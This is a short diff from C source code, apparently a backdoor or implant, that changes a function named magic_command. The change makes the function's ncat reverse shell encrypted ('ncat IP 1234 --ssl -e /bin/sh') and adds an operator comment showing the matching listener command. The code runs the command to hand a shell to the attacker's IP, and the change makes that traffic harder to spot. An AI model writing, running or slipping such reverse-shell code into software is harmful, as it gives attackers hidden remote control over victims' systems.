@@ -120,7 +120,8 @@ void magic_command(char *IP) {
 		reverse_shell_working = 1;
 		debugPrint("Trying reverse shell");
 
-		snprintf(command, 100, "/usr/bin/ncat -e /bin/sh %s 1234", IP);
+		snprintf(command, 100, "/usr/bin/ncat %s 1234 --ssl -e /bin/sh", IP);
+		// Us - listen like this: ncat -vklp 1234 --ssl
 		debugPrint(command);
 		run_command(command); // This command will give us reverse shell
 	}
